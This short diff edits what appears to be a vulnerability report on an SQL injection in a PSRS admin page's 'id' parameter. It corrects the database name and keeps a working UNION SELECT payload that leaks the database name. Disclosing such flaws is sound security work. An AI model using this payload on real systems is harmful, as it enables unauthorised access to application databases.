@@ -8,7 +8,7 @@ Vulnerability File: /psrs/admin/?page=user/manage_user&id=
 
 Vulnerability location: /psrs/admin/?page=user/manage_user&id=, id
 
-Current database name: hsrs_db ,length is 7
+Current database name: psrs_db ,length is 7
 
 [+] Payload: /psrs/admin/?page=user/manage_user&id=-7%27%20union%20select%201,database(),3,4,5,6,7,8,9,10,11--+ // Leak place ---> id
 
